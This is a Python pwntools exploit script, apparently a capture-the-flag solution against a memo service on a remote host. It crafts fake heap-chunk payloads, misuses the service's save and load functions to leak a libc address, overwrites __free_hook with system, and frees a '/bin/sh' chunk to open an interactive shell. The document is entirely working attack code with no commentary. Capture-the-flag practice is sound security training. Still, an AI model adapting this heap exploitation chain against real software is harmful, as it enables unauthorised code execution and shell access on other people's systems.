from pwn import *

libc = ELF('./libc')
r = remote('memo.eatpwnnosleep.com', 8888)

def listmemo():
    r.sendlineafter('> \n', '1')

def write(content):
    r.sendlineafter('> \n', '2')
    r.sendafter('> \n', content)
    
def edit(idx, content):
    r.sendlineafter('> \n', '3')
    r.sendlineafter('> \n', str(idx))
    r.sendlineafter('> \n', content)

def delete(idx):
    r.sendlineafter('> \n', '4')
    r.sendlineafter('> \n', str(idx))


def save(idx, name):
    r.sendlineafter('> \n', '5')
    r.sendlineafter('> \n', str(idx))
    r.sendlineafter('> \n', name)

def load(name, start, end):
    r.sendlineafter('> \n', '6')
    r.sendlineafter('> \n', name)
    r.sendlineafter('> \n', str(start))
    r.sendlineafter('> \n', str(end))

bss = 0x603100
r.sendlineafter('> \n', '1')
r.sendlineafter('> \n', 'XXIDNNI1VV')
write(p64(0x50)+p64(0x21)+p64(0x602f18)+p64(0x100)+'\n')
write(p64(0x50)+p64(0x21)+p64(bss+0x40)+p64(0x100)+'\n')
write(p64(0x50)+p64(0x21)+p64(bss)+p64(0x100)+'\n')
save(0, '')
r.close()
r = remote('memo.eatpwnnosleep.com', 8888)
r.sendlineafter('> \n', '1')
r.sendlineafter('> \n', 'XXIDNNI1VV')
write('a\n')
write('b\n')
delete(0)
load('core', 0x4070-0x50, 0x407f)
listmemo()
r.recvuntil('0.\n')

libc.address = u64(r.recvn(8))-libc.symbols['free']
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

log.info('LIBC BASE: 0x{:016X}'.format(libc.address))

delete(1)
load('core', 0x40e0-0x50, 0x40ef)
edit(0, p64(0x50)+p64(0x21)+p64(free_hook)+p64(0x100))
delete(1)
load('core', 0x4150-0x50, 0x415f)
save(0, 'wow')
delete(1)
load('wow', 0, 0x5f)
edit(0, p64(system))
write('/bin/sh\x00\n')
delete(2)

r.interactive()
